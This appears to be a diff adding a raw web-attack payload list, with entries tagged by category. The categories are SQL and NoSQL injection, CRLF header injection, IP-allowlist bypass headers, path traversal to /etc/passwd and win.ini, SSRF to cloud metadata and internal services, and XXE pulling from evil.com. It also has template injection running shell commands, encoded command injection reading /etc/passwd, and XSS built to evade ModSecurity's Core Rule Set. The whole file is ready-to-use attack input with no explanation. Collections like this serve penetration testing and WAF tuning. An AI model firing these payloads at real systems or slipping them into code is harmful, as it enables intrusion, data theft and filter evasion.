+PAYLOAD: X-Forwarded-For: 127.0.0.1, 2130706433
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1, localhost
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1, 0.0.0.0
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1, ::1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1, 0177.0.0.1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1, 127.1
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent:
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent:  
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: {{7*7}}
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: %0d%0aSet-Cookie: injected=true
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: ' OR '1'='1
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: *)(uid=*))(|(uid=*)
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: Fuzz Faster U Fool
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: feroxbuster/2.10.0
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: gobuster/3.1.0
+--------------------------------------------------------------------------------
+[User-Agent] Diverse JSON (Basic) - User-Agent
+PAYLOAD: User-Agent: Firefox
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: %252527%252520OR%252520%2527a%252527%253D%252527a
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: \u0027\u0020OR\u0020\u0027a\u0027\u003D\u0027a
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: \u0027\u0020UNION\u0020SELECT\u0020null--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: admin'/**/--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: %2527/**/OR/**/1=1--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '%0AOR%0A1=1--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '%0DOR%0D1=1--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '%A0OR%A01=1--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '||'a'='a
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '||(SELECT'a')='a
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '+(SELECT'a')+'='a
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: 'CONCAT('a')='a
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: CHAR(39)+OR+1=1--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: CHR(39)||OR||1=1--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: '/**/AND/**/SLEEP(5)--
+--------------------------------------------------------------------------------
+[SQL Injection - Advanced Bypass] Diverse JSON (Advanced) - SQL Injection - Advanced Bypass
+PAYLOAD: 'UNION/*#*/SELECT/*#*/1,2,3--
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Custom: test\r\nSet-Cookie: admin=true
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Custom: test%0d%0aSet-Cookie: admin=true
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Custom: test%0D%0ALocation: http://evil.com
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Custom: test%250d%250aSet-Cookie: admin=true
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Custom: test\u000d\u000aSet-Cookie: admin=true
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: Cookie: $Version=1; admin="true"; $Path="/"; $Domain=target.com
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: Host: target.com\r\nX-Forwarded-Host: evil.com
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: Host: target.com%0d%0aX-Forwarded-Host: evil.com
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: Host: target.com\u000d\u000aX-Forwarded-Host: evil.com
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: User-Agent: Mozilla/5.0\r\nX-Injected: true
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Original-URL: /admin/users
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Original-URL: \u002fadmin
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Original-URL: %2fadmin
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Rewrite-URL: /admin
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Rewrite-URL: /admin\x00
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-HTTP-Method-Override: DELETE
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Method-Override: PATCH
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-HTTP-Method: TRACE
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Real-IP: \u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Client-IP: %31%32%37%2e%30%2e%30%2e%31
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Remote-IP: 0177.0.0.1
+--------------------------------------------------------------------------------
+[HTTP Header Injection - Advanced] Diverse JSON (Advanced) - HTTP Header Injection - Advanced
+PAYLOAD: X-Forwarded-For: 2130706433
+--------------------------------------------------------------------------------
+[Path Traversal - Encoded] Diverse JSON (Advanced) - Path Traversal - Encoded
+PAYLOAD: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+--------------------------------------------------------------------------------
+[Path Traversal - Encoded] Diverse JSON (Advanced) - Path Traversal - Encoded
+PAYLOAD: %252e%252e\%252e%252e\%252e%252e\windows\win.ini
+--------------------------------------------------------------------------------
+[Path Traversal - Encoded] Diverse JSON (Advanced) - Path Traversal - Encoded
+PAYLOAD: \u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd
+--------------------------------------------------------------------------------
+[Path Traversal - Encoded] Diverse JSON (Advanced) - Path Traversal - Encoded
+PAYLOAD: %e0%80%ae%e0%80%ae/etc/passwd
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://%31%32%37%2e%30%2e%30%2e%31/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://2130706433/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://0177.0.0.1/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://0x7f.0x0.0x0.0x1/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://[0:0:0:0:0:0:0:1]/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://[::ffff:127.0.0.1]/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: dict://127.0.0.1:11211/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: gopher://127.0.0.1:80/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: ldap://127.0.0.1:389/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://127.0.0.1.evil.com/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://evil.com@127.0.0.1/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://127.0.0.1#@evil.com/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://metadata.google.internal/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://169.254.169.254/metadata/v1/
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: http://sudo.cc/127.0.0.1
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: file://\u002fetc\u002fpasswd
+--------------------------------------------------------------------------------
+[SSRF - Protocol Smuggling] Diverse JSON (Advanced) - SSRF - Protocol Smuggling
+PAYLOAD: file://%2fetc%2fpasswd
+--------------------------------------------------------------------------------
+[XXE - Advanced Vectors] Diverse JSON (Advanced) - XXE - Advanced Vectors
+PAYLOAD: %3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E
+--------------------------------------------------------------------------------
+[XXE - Advanced Vectors] Diverse JSON (Advanced) - XXE - Advanced Vectors
+PAYLOAD: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]><foo>&xxe;</foo>
+--------------------------------------------------------------------------------
+[XXE - Advanced Vectors] Diverse JSON (Advanced) - XXE - Advanced Vectors
+PAYLOAD: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/evil">]><foo>&xxe;</foo>
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: %7B%7B7%2A7%7D%7D
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: \u007B\u007B7\u002A7\u007D\u007D
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: {{joiner.__init__.__globals__.os.popen('id').read()}}
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: %7B%7B%5F%73%65%6C%66%7D%7D
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: {php}echo `id`;{/php}
+--------------------------------------------------------------------------------
+[SSTI - Framework Specific] Diverse JSON (Advanced) - SSTI - Framework Specific
+PAYLOAD: #set($str=$class.inspect("java.lang.String").type)
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: %7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: \u007B\u0022\u0024ne\u0022\u003Anull\u007D
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: {"$regex": ".*"}
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: {"$where": "this.password.match(/.*/)"}
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: {"$where": "obj.credits > obj.debits"}
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: {"selector":{"_id":{"$gt":null}}}
+--------------------------------------------------------------------------------
+[NoSQL Injection - Advanced] Diverse JSON (Advanced) - NoSQL Injection - Advanced
+PAYLOAD: {"selector":{"$and":[{"_id":{"$gt":null}}]}}
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: %3Bcat%20%2Fetc%2Fpasswd
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: %26%26cat%20%2Fetc%2Fpasswd
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: %7Ccat%20%2Fetc%2Fpasswd
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: \u003Bcat\u0020\u002Fetc\u002Fpasswd
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: \u007Cid
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: `printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+--------------------------------------------------------------------------------
+[Command Injection - Encoded] Diverse JSON (Advanced) - Command Injection - Encoded
+PAYLOAD: ${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: []['\x66\x69\x6c\x74\x65\x72']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('a\x6c\x65\x72\x74(1)')()
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %25%33%43%25%73%25%76%25%67%25%20%25%6f%25%6e%25%6c%25%6f%25%61%25%64%25%3d%25%61%25%6c%25%65%25%72%25%74%25%28%25%31%25%29%25%3e
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Cmath%253E%253Cmi%252F%252Fonload%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Ctable%2520background%253D%2522javascript%253Aalert%25281%2529%2522%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Cobject%2520data%253D%2522data%253Atext%252Fhtml%253Bbase64%252CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%253D%253D%2522%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Ciframe%2520srcdoc%253D%2522%2526lt%253Bimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%2526gt%253B%2522%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Cform%2520id%253Dtest%253E%253Cbutton%2520id%253Dx%253E%253C%252Fbutton%253E%253C%252Fform%253E%253Cscript%253Ealert%2528test.x.id%2529%253C%252Fscript%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253CdEtAiLs%250Aopen%250Aontoggle%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Cimg%252Fsrc%253Dx%252Fonerror%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Cimg%2520src%253Dx%2520onerror%253D%2522throw~delete~void%255Cx20alert%25281%2529%2522%253E
+--------------------------------------------------------------------------------
+[Extreme Evasion] ModSec CRS繞過
+PAYLOAD: %253Csvg%2520onload%253D%2522delete%252F%252A%252A%252Falert%25281%2529%2522%253E
+--------------------------------------------------------------------------------
